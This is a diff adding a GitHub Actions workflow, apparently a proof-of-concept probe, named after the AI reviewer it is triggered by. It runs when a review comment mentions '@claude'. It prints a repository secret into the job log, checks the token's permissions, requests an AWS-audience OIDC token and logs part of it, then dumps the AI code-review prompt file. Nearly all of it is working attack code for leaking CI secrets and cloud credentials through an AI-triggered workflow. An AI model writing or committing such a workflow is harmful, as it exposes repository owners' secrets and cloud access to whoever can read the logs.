@@ -1,0 +1,37 @@
+name: claude-prompt-poc
+on:
+  pull_request_review_comment:
+    types: [created]
+permissions:
+  contents: write
+  pull-requests: write
+  issues: write
+  id-token: write
+jobs:
+  probe:
+    if: contains(github.event.comment.body, '@claude')
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v6
+      - name: availability probe
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "association=${{ github.event.comment.author_association }} actor=${{ github.actor }}"
+          echo "head_is_fork=${{ github.event.pull_request.head.repo.fork }} head_repo=${{ github.event.pull_request.head.repo.full_name }}"
+          echo "SECRET=[${{ secrets.POC_MARKER_SECRET }}]"
+          echo "ref=$GITHUB_REF"
+          echo "rename/delete probe"
+          gh api repos/${{ github.repository }} --jq '.permissions' || true
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+            echo "OIDC endpoint present"
+            curl -sS --max-time 10 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" -o oidc.json -w "http=%{http_code}\n" || true
+            head -c 200 oidc.json; echo
+          else
+            echo "no OIDC env"
+          fi
+      - name: identity
+        run: |
+          echo "HEAD=$(git rev-parse HEAD)"
+          echo "--- .github/prompts/code-review.md ---"
+          cat .github/prompts/code-review.md
